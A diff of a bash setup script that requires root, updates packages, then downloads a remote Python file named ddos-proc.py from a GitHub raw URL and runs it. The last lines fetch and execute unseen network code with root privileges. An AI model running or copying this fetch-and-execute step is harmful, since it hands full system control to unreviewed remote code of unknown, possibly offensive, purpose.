@@ -2,7 +2,11 @@
 
 set -e
 
-export DEBIAN_FRONTEND=noninteractive
+# Require root
+if [ "$EUID" -ne 0 ]; then
+    echo "[ERROR] Please run this script as root."
+    exit 1
+fi
 
 echo "[INFO] Updating packages..."
 apt update -y
@@ -39,5 +43,12 @@ else
     echo "[INFO] curl already installed. Skipping."
 fi
 
-echo "[INFO] Running remote Python script..."
-curl -fsSL https://raw.githubusercontent.com/LakshyaTheMinecrafter/skript.sh/main/ddos-proc.py | python3
+echo "[INFO] Downloading Python script..."
+curl -fsSL \
+https://raw.githubusercontent.com/LakshyaTheMinecrafter/skript.sh/main/ddos-proc.py \
+-o /tmp/ddos-proc.py
+
+chmod +x /tmp/ddos-proc.py
+
+echo "[INFO] Running Python script..."
+python3 /tmp/ddos-proc.py
